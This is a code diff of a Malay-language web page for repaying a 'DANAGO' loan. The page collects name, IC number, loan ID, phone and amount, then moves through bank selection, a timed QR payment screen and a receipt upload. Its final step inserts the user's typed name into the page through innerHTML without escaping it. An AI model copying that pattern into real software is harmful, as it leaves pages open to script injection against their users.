+            setTimeout(() => { document.getElementById('scammerModal').classList.remove('hidden'); }, 200);
+        }
 
-    <section class="panel checkout hidden" id="checkoutPanel">
-      <div class="card-title">
-        <h2>Halaman Bayaran</h2>
-        <span>Langkah 2</span>
-      </div>
+        function closeScammerModal() {
+            document.getElementById('scammerModal').classList.add('hidden');
+        }
 
-      <div class="flow">
-        <div class="step">Pilih Syarikat</div>
-        <div class="step">Pilih Kaedah Bayaran</div>
-        <div class="step">QR Code</div>
-      </div>
+        function goToNextStepPage(event) {
+            event.preventDefault();
 
-      <div class="grid">
-        <div class="field">
-          <label for="fullName">Nama Penuh (IC)</label>
-          <input id="fullName" type="text" placeholder="Contoh: Ahmad Bin Ali" />
-        </div>
+            const nama = document.getElementById('inputNama').value;
+            const ic = document.getElementById('inputIC').value;
+            const loanID = document.getElementById('inputLoanID').value;
+            const phone = document.getElementById('inputPhone').value;
+            const amaun = document.getElementById('inputAmaun').value;
 
-        <div class="field">
-          <label for="icNumber">IC.Number</label>
-          <input id="icNumber" type="text" placeholder="Contoh: 900101-10-1234" />
-        </div>
+            namaPelangganGlobal = nama;
 
-        <div class="field">
-          <label for="appId">ID APP</label>
-          <input id="appId" type="text" placeholder="Contoh: DG00000 / CUST100000" />
-        </div>
+            document.getElementById('reviewNama').innerText = nama;
+            document.getElementById('reviewIC').innerText = ic;
+            document.getElementById('reviewLoanID').innerText = loanID.toUpperCase();
+            document.getElementById('reviewPhone').innerText = phone;
+            
+            const amaunFormat = parseFloat(amaun).toFixed(2);
+            document.getElementById('reviewAmaun').innerText = "RM " + amaunFormat;
 
-        <div class="field">
-          <label for="phone">Nombor Telefon</label>
-          <input id="phone" type="tel" placeholder="Contoh: 0123456789" />
-        </div>
+            document.getElementById('displayLoanID').innerText = loanID.toUpperCase();
+            document.getElementById('displayMainAmaun').innerText = "RM " + amaunFormat;
+            document.getElementById('displaySubAmaun').innerText = "RM " + amaunFormat;
 
-        <div class="field full">
-          <label for="email">Email</label>
-          <input id="email" type="email" placeholder="Contoh: nama@email.com" />
-        </div>
-      </div>
+            document.getElementById('qrLoanID').innerText = loanID.toUpperCase();
+            document.getElementById('qrMainAmaun').innerText = "RM " + amaunFormat;
 
-      <div class="payment-section">
-        <div class="card-title" style="margin-bottom:10px;">
-          <h2>Pilih Kaedah Pembayaran</h2>
-          <span id="selectedCompanyLabel">Syarikat: -</span>
-        </div>
+            document.getElementById('paymentPage').classList.add('hidden');
+            document.getElementById('nextStepPage').classList.remove('hidden');
+            window.scrollTo({top: 0, behavior: 'smooth'});
+        }
 
-        <div class="method-grid">
-          <div class="method" data-method="duitnow">DuitNow QR</div>
-          <div class="method" data-method="banktransfer">Bank Transfer</div>
-          <div class="method" data-method="onlinebanking">Online Banking</div>
-        </div>
+        function backToInformationPage() {
+            document.getElementById('nextStepPage').classList.add('hidden');
+            document.getElementById('paymentPage').classList.remove('hidden');
+            window.scrollTo({top: 0, behavior: 'smooth'});
+        }
 
-        <div class="note" id="methodHint">
-          Sila pilih kaedah pembayaran.
-        </div>
+        function goToStep3Page() {
+            document.getElementById('nextStepPage').classList.add('hidden');
+            document.getElementById('step3Page').classList.remove('hidden');
+            window.scrollTo({top: 0, behavior: 'smooth'});
+        }
 
-        <div class="bank-row hidden" id="duitnowBankRow">
-          <button class="bank" data-bank="Touch@Go">1. Touch@Go</button>
-          <button class="bank" data-bank="Mcash">2. Mcash</button>
-          <button class="bank" data-bank="Maybank QRPAY">3. Maybank QRPAY</button>
-          <button class="bank" data-bank="Boost">4. Boost</button>
-          <button class="bank" data-bank="Grab Pay">5. Grab Pay</button>
-          <button class="bank" data-bank="DuitNow QRPAY">6. DuitNow QRPAY</button>
-        </div>
+        function backToStep2Page() {
+            document.getElementById('step3Page').classList.add('hidden');
+            document.getElementById('nextStepPage').classList.remove('hidden');
+            window.scrollTo({top: 0, behavior: 'smooth'});
+        }
 
-        <div class="switch hidden" id="duitnowNextWrap">
-          <button class="btn btn-primary" id="nextBtn">Seterusnya</button>
-        </div>
+        function checkBankSelection() {
+            const selectBank = document.getElementById('selectBank').value;
+            const btnFinalNext = document.getElementById('btnFinalNext');
+            
+            if (selectBank !== "") {
+                btnFinalNext.disabled = false;
+                btnFinalNext.className = "flex-1 bg-gradient-to-r from-black to-red-700 text-white font-bold py-3.5 rounded-xl text-xs text-center shadow-xs cursor-pointer transition duration-150";
+            }
+        }
 
-        <div class="qr-wrap" id="qrWrap">
-          <div class="qr-top">
-            <strong>Paparan QR Code</strong>
-            <div class="timer" id="countdown">02:59</div>
-          </div>
-          <div class="qr-box">
-            <span>QR Code di sini</span>
-          </div>
-          <div class="success" id="successMsg"></div>
-        </div>
-      </div>
+        function goToQRPage() {
+            const selectBank = document.getElementById('selectBank');
+            const bankText = selectBank.options[selectBank.selectedIndex].text.substring(3);
+            document.getElementById('qrBankBadge').innerText = bankText;
 
-      <div class="switch" style="margin-top:18px;">
-        <button class="btn btn-soft" id="backBtn">Kembali</button>
-      </div>
-    </section>
+            document.getElementById('step3Page').classList.add('hidden');
+            document.getElementById('qrPage').classList.remove('hidden');
+            window.scrollTo({top: 0, behavior: 'smooth'});
 
-    <footer>© 2026 Razorpay Curler</footer>
-  </div>
+            startCountdown();
+        }
 
-  <script>
-    const openCheckout = document.getElementById('openCheckout');
-    const goCompany = document.getElementById('goCompany');
-    const checkoutPanel = document.getElementById('checkoutPanel');
-    const resetAll = document.getElementById('resetAll');
-    const company = document.getElementById('company');
-    const selectedCompanyLabel = document.getElementById('selected
+        function backToStep3Page() {
+            clearInterval(timerInstance);
+            document.getElementById('qrPage').classList.add('hidden');
+            document.getElementById('step3Page').classList.remove('hidden');
+            window.scrollTo({top: 0, behavior: 'smooth'});
+        }
+
+        function startCountdown() {
+            clearInterval(timerInstance);
+            let timeAllocated = 119; 
+            const display = document.getElementById('countdownTimer');
+
+            timerInstance = setInterval(function () {
+                let minutes = parseInt(timeAllocated / 60, 10);
+                let seconds = parseInt(timeAllocated % 60, 10);
+
+                minutes = minutes < 10 ? minutes : minutes;
+                seconds = seconds < 10 ? "0" + seconds : seconds;
+
+                display.innerText = minutes + "m " + seconds + "s";
+
+                if (--timeAllocated < 0) {
+                    clearInterval(timerInstance);
+                    display.innerText = "QR Code Expired";
+                    alert("Masa transaksi telah tamat. Sila dapatkan semula kod pembayaran baharu.");
+                    backToStep3Page();
+                }
+            }, 1000);
+        }
+
+        function handleFileSelected() {
+            const fileInput = document.getElementById('receiptUpload');
+            const placeholder = document.getElementById('uploadPlaceholder');
+            const successDiv = document.getElementById('uploadSuccess');
+            const fileNameDisplay = document.getElementById('fileNameDisplay');
+            const btnSubmitForm = document.getElementById('btnSubmitForm');
+
+            if (fileInput.files.length > 0) {
+                const file = fileInput.files[0];
+                placeholder.classList.add('hidden');
+                successDiv.classList.remove('hidden');
+                fileNameDisplay.innerText = "Fail dipilih: " + file.name;
+                
+                btnSubmitForm.disabled = false;
+                btnSubmitForm.className = "flex-1 bg-gradient-to-r from-red-600 to-black text-white font-bold py-3.5 rounded-xl text-xs text-center shadow-md cursor-pointer transition duration-150 active:scale-95";
+            }
+        }
+
+        function finalSubmission() {
+            clearInterval(timerInstance);
+            
+            const susunanAyat = "Terima kasih <span class='font-extrabold text-slate-900'>" + namaPelangganGlobal + "</span> kerana telah berjaya membuat bayaran balik pinjaman anda di <span class='font-extrabold text-red-600'>DANAGO</span>.";
+            document.getElementById('thanksMessage').innerHTML = susunanAyat;
+
+            document.getElementById('qrPage').classList.add('hidden');
+            document.getElementById('thanksPage').classList.remove('hidden');
+            window.scrollTo({top: 0, behavior: 'smooth'});
+        }
+    </script>
+</body>
+</html>
